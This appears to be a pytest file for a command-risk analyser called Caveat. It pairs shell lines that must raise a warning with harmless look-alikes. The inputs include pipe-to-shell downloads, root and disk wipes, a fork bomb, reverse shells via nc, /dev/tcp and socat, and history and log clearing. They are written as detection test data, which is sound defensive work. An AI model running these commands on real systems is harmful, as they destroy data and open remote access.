"""
The detections.

Every rule gets two tests: one line that must trip it, and one that looks like
it but must not. The second is the one that keeps the tool usable — a reader
who is warned about everything stops reading warnings, and a false alarm on an
ordinary line costs more trust than a missed one gains.
"""

import pytest

from caveat.core.assess import read_command
from caveat.core.lexer import lex
from caveat.core.model import Severity
from caveat.core.rules import RULES, run


def categories(source):
    return {f.category for f in read_command(source).findings}


def severities(source, category):
    return {f.severity for f in read_command(source).findings
            if f.category == category}


def titles(source):
    return [f.title for f in read_command(source).findings]


def worst(source):
    return read_command(source).worst


# --- running code nobody read ----------------------------------------------

def test_a_download_piped_into_a_shell_is_an_alert():
    assert Severity.ALERT in severities(
        "curl -fsSL https://x/i.sh | sh", "remote-exec")


def test_a_download_piped_into_sudo_bash_is_an_alert():
    assert Severity.ALERT in severities(
        "curl -fsSL https://x/i.sh | sudo bash", "remote-exec")


def test_a_download_through_an_intermediate_stage_is_still_caught():
    assert Severity.ALERT in severities(
        "wget -qO- https://x | tee saved | bash", "remote-exec")


def test_a_download_to_a_file_is_not_a_remote_execution():
    assert Severity.ALERT not in severities(
        "curl -sL https://x -o f.tar.gz", "remote-exec")


def test_a_shell_before_a_fetcher_is_not_a_remote_execution():
    assert Severity.ALERT not in severities("cat urls | xargs curl -O",
                                            "remote-exec")


def test_a_process_substitution_into_bash_is_an_alert():
    assert "A download is substituted in and then run" in titles(
        "bash <(curl -s https://x/y.sh)")


def test_an_eval_of_a_downloaded_substitution_is_an_alert():
    assert "A download is substituted in and then run" in titles(
        'eval "$(curl -s https://x/y.sh)"')


def test_a_substitution_without_a_download_is_not_a_remote_execution():
    assert "A download is substituted in and then run" not in titles(
        'eval "$(date)"')


def test_decoded_text_run_as_code_is_an_alert():
    assert Severity.ALERT in severities("echo aGk= | base64 -d | sh",
                                        "obfuscation")


def test_decoding_without_running_is_not_an_alert():
    assert Severity.ALERT not in severities("echo aGk= | base64 -d > out",
                                            "obfuscation")


def test_base64_encoding_is_not_treated_as_decoding():
    assert Severity.ALERT not in severities("cat f | base64 | sh",
                                            "obfuscation")


def test_a_long_encoded_blob_is_a_notice():
    blob = "QUJD" * 40
    assert "A long run of encoded text is embedded in the line" in titles(
        f"echo {blob}")


def test_a_short_argument_is_not_an_encoded_blob():
    assert "A long run of encoded text is embedded in the line" not in titles(
        "echo aGVsbG8=")


def test_eval_is_a_warning_in_its_own_right():
    assert "eval turns text back into commands" in titles('eval "$CMD"')


# --- deleting ---------------------------------------------------------------

def test_deleting_the_root_is_an_alert():
    assert "The delete target is the whole filesystem" in titles("rm -rf /")


def test_no_preserve_root_is_called_out_on_its_own():
    assert "This asks to delete the filesystem root itself" in titles(
        "sudo rm -rf / --no-preserve-root")


def test_deleting_home_is_an_alert():
    assert "The delete target is your whole home directory" in titles(
        "rm -rf $HOME")


def test_deleting_a_system_directory_is_an_alert():
    assert any("system directory" in t for t in titles("rm -rf /usr"))


def test_a_variable_with_a_slash_glued_on_is_an_alert():
    assert "The delete target is a variable with a path glued on" in titles(
        'rm -rf "$BUILD"/')


def test_a_bare_variable_target_is_a_warning_not_an_alert():
    assert "The delete target comes from a variable" in titles('rm -rf "$BUILD"')


def test_a_star_target_is_a_warning():
    assert any("everything here" in t for t in titles("rm -rf *"))


def test_an_ordinary_recursive_delete_is_only_a_notice():
    found = [f for f in read_command("rm -rf build/").findings
             if f.category in ("destroy", "root-delete", "wipe")]
    assert found and all(f.severity is Severity.NOTICE for f in found)


def test_deleting_one_named_file_raises_nothing_destructive():
    assert "destroy" not in categories("rm notes.txt")


# --- disks ------------------------------------------------------------------

def test_dd_onto_a_device_is_an_alert():
    assert "disk" in categories("sudo dd if=/dev/zero of=/dev/sda bs=1M")


def test_dd_onto_a_file_is_a_warning_not_an_alert():
    assert Severity.ALERT not in severities("dd if=a of=b", "disk")


def test_dd_reading_from_a_device_is_not_an_alert():
    assert "disk" not in categories("dd if=/dev/sda of=backup.img")


def test_mkfs_is_an_alert():
    assert "disk" in categories("mkfs.ext4 /dev/sdb1")


def test_a_redirect_onto_a_device_is_an_alert():
    assert "disk" in categories("echo x > /dev/sda")


def test_a_redirect_to_dev_null_is_not_a_disk_write():
    assert "disk" not in categories("echo x > /dev/null")


def test_wipefs_all_is_an_alert():
    assert "disk" in categories("wipefs -a /dev/sdb")


# --- fork bomb --------------------------------------------------------------

def test_the_classic_fork_bomb_is_recognised():
    assert "This is a fork bomb" in titles(":(){ :|:& };:")


def test_a_renamed_fork_bomb_is_recognised():
    assert "This is a fork bomb" in titles("bomb(){ bomb|bomb& };bomb")


def test_an_ordinary_function_definition_is_not_a_fork_bomb():
    assert "This is a fork bomb" not in titles("greet(){ echo hi; }; greet")


# --- permissions ------------------------------------------------------------

def test_chmod_777_is_a_warning():
    assert "This makes a file readable and writable by everyone" in titles(
        "chmod 777 /var/www")


def test_chmod_755_is_not_a_warning():
    assert "This makes a file readable and writable by everyone" not in titles(
        "chmod 755 /var/www")


def test_a_setuid_bit_is_a_warning():
    assert any("setuid" in t for t in titles("chmod 4755 /usr/local/bin/x"))


def test_a_recursive_chmod_of_a_system_directory_is_an_alert():
    assert Severity.ALERT in severities("sudo chmod -R 755 /usr", "perm")


def test_chown_recursive_outside_home_is_a_notice():
    assert any("who owns" in t for t in titles("sudo chown -R nobody /var/www"))


def test_chown_recursive_inside_home_is_not_flagged():
    assert not any("who owns" in t
                   for t in titles("chown -R me /home/me/project"))


def test_turning_off_selinux_is_a_warning():
    assert "This turns SELinux enforcement off" in titles("setenforce 0")


# --- privilege --------------------------------------------------------------

def test_sudo_anywhere_is_at_least_a_notice():
    assert "privilege" in categories("sudo apt update")


def test_a_line_without_sudo_says_so():
    assert "Nothing on this line asks for root" in titles("ls -l")


def test_piping_into_sudo_is_a_warning():
    assert "Data is piped into a command running as root" in titles(
        "cat f | sudo tee /etc/hosts")


def test_sudo_not_piped_into_is_not_that_warning():
    assert "Data is piped into a command running as root" not in titles(
        "sudo ls")


def test_sudo_reading_a_password_from_stdin_is_a_warning():
    assert "sudo is told to read your password from the pipe" in titles(
        "echo pw | sudo -S ls")


# --- transport --------------------------------------------------------------

def test_curl_insecure_is_a_warning():
    assert "tls" in categories("curl -k https://x -o f")


def test_wget_without_certificate_checking_is_a_warning():
    assert "tls" in categories("wget --no-check-certificate https://x")


def test_git_with_ssl_verification_off_is_a_warning():
    assert "tls" in categories("git -c http.sslVerify=false clone https://x")


def test_an_ordinary_https_fetch_is_not_a_tls_warning():
    assert Severity.WARNING not in severities("curl -sL https://x -o f", "tls")


def test_plain_http_piped_into_a_shell_is_a_warning():
    assert Severity.WARNING in severities("curl -s http://x/i.sh | sh",
                                          "transport")


def test_plain_http_to_a_file_is_only_a_notice():
    assert Severity.WARNING not in severities("curl -s http://x -o f",
                                              "transport")


def test_https_is_not_a_transport_finding():
    assert "transport" not in categories("curl -sL https://x -o f")


# --- trust ------------------------------------------------------------------

def test_disabling_host_key_checking_is_a_warning():
    assert "SSH is told not to check the host key" in titles(
        "ssh -o StrictHostKeyChecking=no user@host")


def test_accept_new_is_only_a_notice():
    assert "SSH will trust whichever key it sees first" in titles(
        "ssh -o StrictHostKeyChecking=accept-new user@host")


def test_a_plain_ssh_is_not_a_trust_finding():
    assert "trust" not in categories("ssh user@host")


def test_discarding_known_hosts_is_a_warning():
    assert "SSH is told to forget the host key afterwards" in titles(
        "ssh -o UserKnownHostsFile=/dev/null user@host")


def test_agent_forwarding_is_a_notice():
    assert "Your SSH agent is forwarded to the remote machine" in titles(
        "ssh -A user@host")


# --- backdoors --------------------------------------------------------------

def test_netcat_with_a_program_attached_is_an_alert():
    assert "backdoor" in categories("nc -e /bin/sh 10.0.0.1 4444")


def test_a_plain_netcat_port_check_is_not_a_backdoor():
    assert "backdoor" not in categories("nc -z 10.0.0.1 22")


def test_a_bash_tcp_redirect_is_an_alert():
    assert "backdoor" in categories("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")


def test_socat_with_exec_is_an_alert():
    assert "backdoor" in categories(
        "socat tcp-connect:10.0.0.1:4444 exec:/bin/sh")


def test_an_inline_program_opening_a_socket_is_an_alert():
    assert "backdoor" in categories(
        "python3 -c 'import s;s.socket();s.connect(1);s.dup2(0)'")


def test_listening_without_a_program_is_only_a_notice():
    assert "This opens a listening port on this machine" in titles("nc -l 4444")


# --- the record -------------------------------------------------------------

def test_clearing_history_is_a_warning():
    assert "tracks" in categories("history -c")


def test_unsetting_the_history_file_is_a_warning():
    assert "tracks" in categories("unset HISTFILE")


def test_deleting_a_log_is_a_warning():
    assert "tracks" in categories("sudo rm -rf /var/log/auth.log")


def test_vacuuming_the_journal_is_a_warning():
    assert "tracks" in categories("journalctl --vacuum-time=1s")


def test_reading_a_log_is_not_covering_tracks():
    assert "tracks" not in categories("tail -f /var/log/auth.log")


# --- persistence and services ----------------------------------------------

def test_installing_a_crontab_is_a_notice():
    assert "persistence" in categories("crontab -")


def test_removing_a_crontab_is_a_warning():
    assert "This removes every scheduled job for the user" in titles(
        "crontab -r")


def test_listing_a_crontab_is_not_persistence():
    assert "persistence" not in categories("crontab -l")


def test_enabling_a_service_is_a_notice():
    assert "persistence" in categories("sudo systemctl enable nginx")


def test_stopping_a_service_is_a_notice():
    assert "service" in categories("sudo systemctl stop nginx")


def test_backgrounding_is_a_notice():
    assert "lifecycle" in categories("sleep 60 &")


# --- defences ---------------------------------------------------------------

def test_disabling_the_firewall_is_a_warning():
    assert "defence" in categories("sudo ufw disable")


def test_flushing_iptables_is_a_warning():
    assert "defence" in categories("sudo iptables -F")


def test_adding_an_iptables_rule_is_not_a_defence_finding():
    assert "defence" not in categories("sudo iptables -A INPUT -j DROP")


# --- processes, containers, packages ---------------------------------------

def test_killing_everything_is_an_alert():
    assert Severity.ALERT in severities("kill -9 -1", "process")


def test_killing_one_process_is_not_flagged():
    assert "process" not in categories("kill 4242")


def test_a_privileged_container_is_a_warning():
    assert "container" in categories("docker run --privileged alpine sh")


def test_mounting_the_host_root_is_a_warning():
    assert "container" in categories("docker run -v /:/host alpine sh")


def test_an_ordinary_bind_mount_is_not_flagged():
    assert "container" not in categories("docker run -v ./data:/data alpine sh")


def test_the_docker_socket_is_a_warning():
    assert "container" in categories(
        "docker run -v /var/run/docker.sock:/var/run/docker.sock alpine")


def test_pip_from_a_url_is_a_notice():
    assert "supply-chain" in categories("pip install https://x/pkg.tar.gz")


def test_npm_install_mentions_its_own_scripts():
    assert "supply-chain" in categories("npm install")


def test_pip_from_the_index_is_quiet_about_the_source():
    assert not any("straight from a URL" in t
                   for t in titles("pip install requests"))


# --- quoting and the unknown ------------------------------------------------

def test_an_unquoted_variable_is_a_notice():
    assert "quoting" in categories("rm -rf $DIR")


def test_a_quoted_variable_is_not_flagged():
    assert "quoting" not in categories('cp "$DIR" /tmp/')


def test_a_variable_inside_single_quotes_is_not_flagged():
    assert "quoting" not in categories("awk '{print $2}'")


def test_an_unquoted_at_sign_is_a_notice():
    assert "quoting" in categories("run $@")


def test_an_assignment_is_not_an_unquoted_use():
    assert "quoting" not in categories("DIR=/tmp")


def test_an_unknown_command_is_reported_as_unknown():
    assert "unknown" in categories("frobnicate --wibble")


def test_a_command_built_from_a_variable_is_a_warning():
    assert "The command itself comes from an expansion" in titles("$CMD --go")


def test_running_by_path_is_noted():
    assert any("by path" in t for t in titles("/tmp/installer --yes"))


def test_a_function_head_is_not_called_an_unknown_command():
    assert not any("no entry for" in t for t in titles("greet(){ echo hi; }"))


def test_unclosed_quoting_is_reported():
    assert "parse" in categories("echo 'oops")


def test_an_inline_interpreter_program_is_a_notice():
    assert any("written inline" in t
               for t in titles("python3 -c 'x = compute(1); print(x)'"))


# --- the narrow good news ---------------------------------------------------

def test_a_clean_read_only_pipeline_collects_reassurances():
    found = titles("ps aux | grep nginx | awk '{print $2}'")
    assert "Nothing on this line writes, deletes or installs" in found
    assert "Every command here is one Caveat recognises" in found


def test_a_write_means_the_read_only_reassurance_is_withheld():
    assert "Nothing on this line writes, deletes or installs" not in titles(
        "ps aux > out.txt")


def test_a_download_to_a_file_is_praised_narrowly():
    assert "The download lands in a file, not in a shell" in titles(
        "curl -sL https://x -o f")


def test_that_praise_is_withheld_when_a_shell_follows():
    assert "The download lands in a file, not in a shell" not in titles(
        "curl -sL https://x -o f && sh f")


def test_https_with_verification_is_praised():
    assert "The transfer is over HTTPS with verification left on" in titles(
        "curl -sL https://x -o f")


def test_that_praise_is_withheld_when_verification_is_off():
    assert "The transfer is over HTTPS with verification left on" not in titles(
        "curl -k -sL https://x -o f")


def test_no_finding_ever_says_the_word_safe_about_the_command():
    for source in ("ls", "curl -sL https://x -o f",
                   "ps aux | grep x | awk '{print $1}'"):
        for finding in read_command(source).findings:
            text = f"{finding.title} {finding.detail}".lower()
            assert " is safe" not in text and "it's safe" not in text


# --- the register itself ----------------------------------------------------

def test_every_rule_returns_a_list_for_an_empty_script():
    empty = lex("")
    for rule in RULES:
        assert isinstance(rule(empty), list), rule.__name__


def test_findings_come_back_most_severe_first():
    findings = run(lex("curl -fsSL http://x/i.sh | sudo bash"))
    ranks = [f.severity.rank for f in findings]
    assert ranks == sorted(ranks, reverse=True)


def test_identical_findings_are_reported_once():
    findings = run(lex("rm -rf / ; rm -rf /"))
    keys = [(f.title, f.stages) for f in findings]
    assert len(keys) == len(set(keys))


@pytest.mark.parametrize("source", [
    "ls", "rm -rf /", "curl -s http://x | sh", ":(){ :|:& };:",
    "echo 'unbalanced", "", "   ", "sudo dd if=/dev/zero of=/dev/sda",
    "$CMD", "a | b | c | d | e | f | g", "cat <<EOF\nx\nEOF",
])
def test_the_rules_never_raise(source):
    run(lex(source))


@pytest.mark.parametrize("source", [
    "rm -rf /", "curl -s http://x/i.sh | sudo bash", "chmod 777 /etc",
    "nc -e /bin/sh 1.2.3.4 9", "history -c", "docker run --privileged x",
])
def test_every_serious_finding_offers_an_alternative(source):
    serious = [f for f in read_command(source).findings
               if f.severity.rank >= Severity.WARNING.rank]
    assert serious
    assert all(f.safer for f in serious), source
